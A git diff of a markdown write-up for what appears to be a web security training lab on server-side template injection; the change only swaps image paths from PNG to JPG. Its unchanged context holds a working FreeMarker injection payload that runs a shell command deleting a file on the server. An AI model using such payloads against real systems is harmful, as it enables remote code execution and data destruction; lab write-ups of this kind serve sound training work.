@@ -10,11 +10,11 @@
 
 ### step 1
 
-![screenshot](./images/lab3_template_expression.png)
+![screenshot](images/lab3_template_expression.jpg)
 
 ### step2
 
-![screenshot](./images/lab3_check_which_template.png)
+![screenshot](images/lab3_check_which_template.jpg)
 
 ### step3
 
@@ -22,4 +22,4 @@
 
 `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`
 
-![screenshot](./images/lab3_template_execution_lab_solved.png)
+![screenshot](images/lab3_template_execution_lab_solved.jpg)
